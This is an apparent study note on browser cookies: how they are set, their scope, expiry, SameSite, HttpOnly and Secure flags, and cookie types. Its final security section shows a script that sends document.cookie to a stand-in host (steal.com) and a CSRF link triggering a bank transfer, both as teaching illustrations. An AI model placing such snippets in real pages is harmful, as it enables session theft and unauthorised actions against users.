# Cookies

## Creating cookies

1. client side

```js
document.cookie = 'hello=1';
```

2. server side

```js
const express = require('express')();
express.get('/', (req, res) => {
  res.header('Set-cookie', 'server=XXX');
  res.sendFile(`${__dirname}/index.html`);
});

express.listen(3000, () => {
  console.log('3000:', 3000);
});
```


## Cookie Properties

- Send with every request

- Scope
  - Domain
  - Path

```js
// example.com
document.cookie='haha=1'
document.cookie='allhaha=2; domain=.example.com'
// document.cookie => haha=1; allhaha=2
```

```js
// www.example.com
document.cookie='wwwhaha=3'
// document.cookie => wwwhaha=3; allhaha=2
```

```js
// localhost:3333/path1
document.cookie='path1=1'
// document.cookie => path1=1
```

```js
// localhost:3333/path2
document.cookie='path2=2'
// document.cookie => path2=2
```


- Expires, Max-age


```js
document.cookie='id=a3fWa; Expires=Wed, 21 Oct 2015 07:28:00 GMT' // => passed time will delete cookie
document.cookie='temcookie=ho; max-age=10'
```

- Same site

```js
//const cookie = "user=keidarcy; samesite=strict; secure"; // only same domain allowed send cookie
const cookie = "user=keidarcy; samesite=lax; secure"; // top level navigation allowed
//const cookie = "user=keidarcy; samesite=none; secure"; // other domain allowed
//const cookie = "user=keidarcy;"; => before chrome80 samesite=none; secure
//const cookie = "user=keidarcy;"; => after chrome80 samesite=lax; secure

res.setHeader("set-cookie", [cookie])
res.send("ok")
```


## Cookie Types

- Session cookie(delete by browser when session ends)

- Permanent cookie(live even close browser)

- HttpOnly cookie
```js
res.header('set-cookie', ['jscannotseethis=456; httponly']);
// document.cookie can not access this cookie
```

- Secure cookie(only send with https protocol)

- Third party cookie(some other origin set cookie)

- Zombie cookie(be deleted but recreate by etags, ip, indexeddb etc...)


## Cookie security

- Stealing cookies

```html
<a id='steal'>steal</a>
<script>
  document.getElementById('steal').href = `https://steal.com?cookie=${document.cookie}`;
</script>
```

- Cross site request forgery(csrf)

```html
<a href='https://goodbank.com?toaccountId=123&money=1999'>hello</a>
<!-- if you have cookie for this domain :) -->
```